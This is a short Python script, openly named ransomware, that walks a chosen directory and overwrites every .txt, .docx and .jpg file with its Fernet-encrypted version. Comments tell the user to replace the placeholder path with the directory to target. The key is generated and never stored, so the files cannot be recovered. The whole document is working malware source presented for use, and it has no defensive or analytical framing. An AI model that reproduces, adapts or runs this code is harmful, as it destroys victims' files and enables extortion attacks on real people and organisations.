import os
from cryptography.fernet import Fernet  # Make sure to install the cryptography library

# Specify the file extensions to target
target_extensions = ['.txt', '.docx', '.jpg']

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    
    cipher_suite = Fernet(key)
    encrypted_data = cipher_suite.encrypt(data)

    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def ransomware(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in target_extensions):
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)

# Example key generation, ensure to keep it secure
encryption_key = Fernet.generate_key()

# Example usage, replace 'target_directory' with the directory you want to target
target_directory = '/path/to/target/directory'
ransomware(target_directory, encryption_key)
